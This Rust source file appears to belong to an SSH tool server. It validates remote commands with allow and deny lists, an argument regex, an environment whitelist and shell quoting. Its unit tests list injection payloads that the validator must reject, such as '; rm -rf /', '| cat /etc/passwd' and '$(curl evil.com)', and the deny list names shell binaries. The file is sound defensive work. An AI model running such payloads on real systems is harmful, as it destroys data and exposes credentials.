use std::collections::HashMap;

use regex::Regex;

use crate::config::CommandConfig;
use crate::error::SshMcpError;

#[derive(Debug)]
pub struct ValidatedCommand {
    pub binary: String,
    pub args: Vec<String>,
    pub env: HashMap<String, String>,
}

impl ValidatedCommand {
    pub fn from_params(
        binary: &str,
        args: &[String],
        env: &HashMap<String, String>,
        config: &CommandConfig,
    ) -> Result<Self, SshMcpError> {
        // 1. Check binary is in allowed list
        if !config.allowed.iter().any(|a| a == binary) {
            return Err(SshMcpError::CommandRejected {
                reason: format!("command '{}' is not in the allowed list", binary),
            });
        }

        // 2. Check binary is NOT in denied list
        if config.denied.iter().any(|d| d == binary) {
            return Err(SshMcpError::CommandRejected {
                reason: format!("command '{}' is explicitly denied", binary),
            });
        }

        // 3. Reject binary names containing '/' (no path-based execution)
        if binary.contains('/') {
            return Err(SshMcpError::CommandRejected {
                reason: "command binary must not contain '/' — use the bare name".into(),
            });
        }

        // 4. Enforce max_args limit
        if args.len() > config.max_args {
            return Err(SshMcpError::CommandRejected {
                reason: format!(
                    "too many arguments ({}, max {})",
                    args.len(),
                    config.max_args
                ),
            });
        }

        // 5. Strict regex validation on each argument
        let pattern = Regex::new(&config.arg_pattern)
            .map_err(|e| SshMcpError::Config(format!("invalid arg_pattern regex: {e}")))?;
        for arg in args {
            if !pattern.is_match(arg) {
                return Err(SshMcpError::CommandRejected {
                    reason: format!(
                        "argument '{}' does not match allowed pattern '{}'",
                        arg, config.arg_pattern
                    ),
                });
            }
        }

        // 6. Validate environment variables against allowed_env whitelist
        let mut validated_env = HashMap::new();
        for (key, value) in env {
            if !config.allowed_env.contains_key(key) {
                return Err(SshMcpError::CommandRejected {
                    reason: format!("environment variable '{}' is not in the allowed list", key),
                });
            }
            // Also validate env values against the arg pattern
            if !pattern.is_match(value) {
                return Err(SshMcpError::CommandRejected {
                    reason: format!(
                        "environment variable value for '{}' does not match allowed pattern",
                        key
                    ),
                });
            }
            validated_env.insert(key.clone(), value.clone());
        }

        Ok(Self {
            binary: binary.to_string(),
            args: args.to_vec(),
            env: validated_env,
        })
    }

    /// Produce a safe exec string for SSH channel.exec().
    /// Each argument is shell-quoted via shlex as a second defense layer.
    pub fn to_exec_string(&self) -> String {
        let mut parts = Vec::new();

        // Prepend env vars
        for (key, value) in &self.env {
            let quoted_val = shlex::try_quote(value).unwrap_or_else(|_| value.into());
            parts.push(format!("{}={}", key, quoted_val));
        }

        // Binary name (already validated, no special chars)
        parts.push(self.binary.clone());

        // Quote each argument
        for arg in &self.args {
            let quoted = shlex::try_quote(arg).unwrap_or_else(|_| arg.into());
            parts.push(quoted.into_owned());
        }

        parts.join(" ")
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_config() -> CommandConfig {
        CommandConfig {
            allowed: vec![
                "ls".into(),
                "cat".into(),
                "grep".into(),
                "ps".into(),
                "df".into(),
                "tail".into(),
                "head".into(),
            ],
            denied: vec!["sh".into(), "bash".into(), "eval".into()],
            max_args: 10,
            max_output_bytes: 1_048_576,
            arg_pattern: r"^[a-zA-Z0-9_./:@=, -]+$".into(),
            allowed_env: HashMap::from([
                ("PATH".into(), "/usr/bin:/bin".into()),
                ("LANG".into(), "en_US.UTF-8".into()),
            ]),
        }
    }

    #[test]
    fn test_valid_command() {
        let config = test_config();
        let cmd = ValidatedCommand::from_params(
            "ls",
            &["-la".into(), "/tmp".into()],
            &HashMap::new(),
            &config,
        );
        assert!(cmd.is_ok());
        let cmd = cmd.unwrap();
        assert_eq!(cmd.binary, "ls");
        assert_eq!(cmd.to_exec_string(), "ls -la /tmp");
    }

    #[test]
    fn test_reject_unlisted_command() {
        let config = test_config();
        let cmd = ValidatedCommand::from_params(
            "rm",
            &["-rf".into(), "/".into()],
            &HashMap::new(),
            &config,
        );
        assert!(cmd.is_err());
        assert!(matches!(cmd, Err(SshMcpError::CommandRejected { .. })));
    }

    #[test]
    fn test_reject_denied_command() {
        let config = test_config();
        // Even if we added "bash" to allowed, denied takes priority in our check order
        let cmd = ValidatedCommand::from_params(
            "bash",
            &["-c".into(), "whoami".into()],
            &HashMap::new(),
            &config,
        );
        assert!(cmd.is_err());
    }

    #[test]
    fn test_reject_path_in_binary() {
        let config = test_config();
        let cmd = ValidatedCommand::from_params("/usr/bin/ls", &[], &HashMap::new(), &config);
        assert!(cmd.is_err());
    }

    #[test]
    fn test_reject_shell_metacharacters_in_args() {
        let config = test_config();
        let cases = vec![
            "; rm -rf /",
            "$(whoami)",
            "`id`",
            "| cat /etc/passwd",
            "&& echo pwned",
            "foo > /tmp/out",
            "$(curl evil.com)",
        ];
        for payload in cases {
            let cmd =
                ValidatedCommand::from_params("ls", &[payload.into()], &HashMap::new(), &config);
            assert!(cmd.is_err(), "Should reject: {}", payload);
        }
    }

    #[test]
    fn test_reject_too_many_args() {
        let config = test_config();
        let args: Vec<String> = (0..11).map(|i| format!("arg{i}")).collect();
        let cmd = ValidatedCommand::from_params("ls", &args, &HashMap::new(), &config);
        assert!(cmd.is_err());
    }

    #[test]
    fn test_valid_env_vars() {
        let config = test_config();
        let env = HashMap::from([("LANG".into(), "en_US.UTF-8".into())]);
        let cmd = ValidatedCommand::from_params("ls", &[], &env, &config);
        assert!(cmd.is_ok());
    }

    #[test]
    fn test_reject_unlisted_env_var() {
        let config = test_config();
        let env = HashMap::from([("SECRET".into(), "hunter2".into())]);
        let cmd = ValidatedCommand::from_params("ls", &[], &env, &config);
        assert!(cmd.is_err());
    }

    #[test]
    fn test_exec_string_with_env() {
        let config = test_config();
        let env = HashMap::from([("LANG".into(), "en_US.UTF-8".into())]);
        let cmd = ValidatedCommand::from_params("ls", &["-la".into()], &env, &config).unwrap();
        let exec = cmd.to_exec_string();
        assert!(exec.contains("LANG="));
        assert!(exec.contains("ls"));
        assert!(exec.contains("-la"));
    }
}
